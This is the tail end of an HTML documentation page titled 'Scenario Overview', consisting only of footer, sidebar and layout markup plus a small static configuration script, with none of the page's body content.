                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                        </a>
                                    </div>
                                </nav>
                            </footer>
                        </main>
                
                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
                            <footer class="flex flex-wrap items-center justify-between">
                                <div>
                                    <ul class="flex flex-wrap items-center text-sm">
                                    </ul>
                                </div>
                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. All rights reserved.</p></div>
                            </footer>
                        </div>
                    </div>
                
                    <!-- Rendered if sidebar right is enabled -->
                    <!-- Sidebar right skeleton-->
                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
                        <div class="pl-5">
                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                        </div>
                    </div>
                
                    <!-- User should be able to hide sidebar right -->
                    <doc-sidebar-right v-cloak></doc-sidebar-right>
                </div>

            </div>
        </div>
    
        <doc-search-mobile></doc-search-mobile>
        <doc-back-to-top></doc-back-to-top>
    </div>


    <div id="docs-overlay-target"></div>

    <script data-cfasync="false">window.__DOCS__ = { "title": "Scenario Overview", level: 5, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
</body>
</html>
